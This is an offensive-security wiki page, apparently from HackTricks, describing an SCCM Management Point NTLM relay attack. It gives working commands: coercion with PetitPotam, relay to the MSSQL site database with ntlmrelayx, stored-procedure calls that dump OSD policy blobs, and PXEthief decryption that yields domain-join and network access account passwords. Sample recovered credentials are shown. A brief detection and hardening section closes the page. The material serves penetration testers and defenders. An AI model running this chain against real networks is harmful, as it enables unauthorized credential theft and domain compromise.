# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
By coercing a **System Center Configuration Manager (SCCM) Management Point (MP)** to authenticate over SMB/RPC and **relaying** that NTLM machine account to the **site database (MSSQL)** you obtain `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights.  These roles let you call a set of stored procedures that expose **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables, etc.).  The blobs are hex-encoded/encrypted but can be decoded and decrypted with **PXEthief**, yielding plaintext secrets.

High-level chain:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
5. Execute:
   * `use CM_<SiteCode>`
   * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
   * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets such as `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. are recovered without touching PXE or clients.

---

## 1. Enumerating unauthenticated MP endpoints
The MP ISAPI extension **GetAuth.dll** exposes several parameters that don’t require authentication (unless the site is PKI-only):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Returns site signing cert public key + GUIDs of *x86* / *x64* **All Unknown Computers** devices. |
| `MPLIST` | Lists every Management-Point in the site. |
| `SITESIGNCERT` | Returns Primary-Site signing certificate (identify the site server without LDAP). |

Grab the GUIDs that will act as the **clientID** for later DB queries:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```

---

## 2. Relay the MP machine account to MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)                              
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
       -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
When the coercion fires you should see something like:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```

---

## 3. Identify OSD policies via stored procedures
Connect through the SOCKS proxy (port 1080 by default):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Switch to the **CM_<SiteCode>** DB (use the 3-digit site code, e.g. `CM_001`).

### 3.1  Find Unknown-Computer GUIDs (optional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```

### 3.2  List assigned policies
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Each row contains `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Focus on policies:
* **NAAConfig**  – Network Access Account creds
* **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
* **CollectionSettings** – Can contain run-as accounts

### 3.3  Retrieve full body
If you already have `PolicyID` & `PolicyVersion` you can skip the clientID requirement using:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANT: In SSMS increase “Maximum Characters Retrieved” (>65535) or the blob will be truncated.

---

## 4. Decode & decrypt the blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Recovered secrets example:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```

---

## 5. Relevant SQL roles & procedures
Upon relay the login is mapped to:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

These roles expose dozens of EXEC permissions, the key ones used in this attack are:

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | List policies applied to a `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Return complete policy body. |
| `MP_GetListOfMPsInSiteOSD` | Returned by `MPKEYINFORMATIONMEDIA` path. |

You can inspect the full list with:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
  AND  pe.permission_name='EXECUTE';
```

---

## 6. Detection & Hardening
1. **Monitor MP logins** – any MP computer account logging in from an IP that isn’t its host ≈ relay.
2. Enable **Extended Protection for Authentication (EPA)** on the site database (`PREVENT-14`).
3. Disable unused NTLM, enforce SMB signing, restrict RPC (
   same mitigations used against `PetitPotam`/`PrinterBug`).
4. Harden MP ↔ DB communication with IPSec / mutual-TLS.

---

## See also
* NTLM relay fundamentals:
  {{#ref}}
  ../ntlm/README.md
  {{#endref}}

* MSSQL abuse & post-exploitation:
  {{#ref}}
  abusing-ad-mssql.md
  {{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
